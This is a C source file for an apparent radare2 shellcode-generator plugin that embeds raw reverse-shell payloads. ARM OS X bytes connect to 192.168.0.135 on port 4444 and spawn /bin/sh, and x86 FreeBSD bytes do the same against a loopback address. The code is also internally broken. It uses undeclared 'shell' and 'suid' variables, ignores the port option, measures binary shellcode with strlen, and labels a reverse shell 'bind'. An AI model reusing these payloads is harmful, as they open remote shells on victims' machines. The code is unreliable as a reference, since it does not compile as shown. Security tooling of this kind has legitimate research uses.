/* radare - LGPL - Copyright 2013 - pancake */

#include <r_egg.h>


unsigned long armle_osx_reverse[]= {
  0xe3a00002, 0xe3a01001, 0xe3a02006, 0xe3a0c061, 0xef000080, 0xe1a0a000, 0xeb000001,
        0x5c110200, //# port 4444
        0x8700a8c0, //# host 192.168.0.135
        0xe1a0000a, 0xe1a0100e, 0xe3a02010, 0xe3a0c062, 0xef000080,
        0xe3a05002, 0xe3a0c05a, 0xe1a0000a, 0xe1a01005, 0xef000080,
        0xe2455001, 0xe3550000, 0xaafffff8, 0xe3a00000, 0xe3a01001,
        0xe3a0c07e, 0xef000080, 0xe0455005, 0xe1a0600d, 0xe24dd020,
        0xe28f0014, 0xe4860000, 0xe5865004, 0xe1a01006, 0xe3a02000,
        0xe3a0c03b, 0xef000080,
        //# /bin/sh
        0x6e69622f, 0x0068732f };

unsigned char x86_freebsd_reverse[] =
"\xeb\x68\x5e\x31\xc0\x31\xdb\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x53\xb0\x61"
"\xcd\x80\x89\xc2\xc6\x46\x01\x02\x66\xc7\x46\x02\x69\x7a\xb3\x10\x53\x8d\x1e"
"\x53\x50\x50\xb0\x62\xcd\x80\x31\xdb\x53\x52\xb0\x5a\x50\xcd\x80\xfe\xc3\x53"
"\x52\xb0\x5a\x50\xcd\x80\xfe\xc3\x53\x52\xb0\x5a\x50\xcd\x80\x31\xdb\x53\x8d"
"\x7e\x0f\x31\xc0\x31\xc9\xb1\x09\xf3\xaa\x8d\x5e\x08\x89\x5e\x10\x8d\x4e\x10"
"\x51\x53\x50\xb0\x3b\xcd\x80\xb0\x01\xcd\x80\xe8\x93\xff\xff\xff\x41\x42\x43"
"\x43\x7f\x00\x00\x01\x2f\x62\x69\x6e\x2f\x73\x68";


static RBuffer *build (REgg *egg) {
	RBuffer *buf = r_buf_new ();
	const ut8 *sc = NULL;
	int cd = 0;
	char *port = r_egg_option_get (egg, "port");
	//TODO: char *udp = r_egg_option_get (egg, "udp");
	switch (egg->os) {
	case R_EGG_OS_OSX:
	case R_EGG_OS_DARWIN:
		switch (egg->arch) {
		case R_SYS_ARCH_ARM:
			sc = armle_osx_reverse;
			cd = 7+36;
			break;
		}
		break;
	case R_EGG_OS_FREEBSD:
		switch (egg->arch) {
		case R_SYS_ARCH_X86:
			switch (egg->bits) {
			case 32: sc = x86_freebsd_reverse; break;
			default: eprintf ("Unsupportted\n");
			}
			break;
		}
		break;
	default:
		eprintf ("unsupported os %x\n", egg->os);
		break;
	}
	if (sc) {
		r_buf_set_bytes (buf, sc, strlen ((const char *)sc));
		if (shell && *shell) {
			if (cd) r_buf_write_at (buf, cd, (const ut8*)shell, strlen (shell)+1);
			else eprintf ("Cannot set shell\n");
		}
	}
	free (suid);
	free (shell);
	return buf;
}

//TODO: rename plugin to run
REggPlugin r_egg_plugin_bind = {
	.name = "bind",
	.type = R_EGG_PLUGIN_SHELLCODE,
	.desc = "listen port=4444",
	.build = (void *)build
};

#ifndef CORELIB
struct r_lib_struct_t radare_plugin = {
	.type = R_LIB_TYPE_EGG,
	.data = &r_egg_plugin_bind
};
#endif
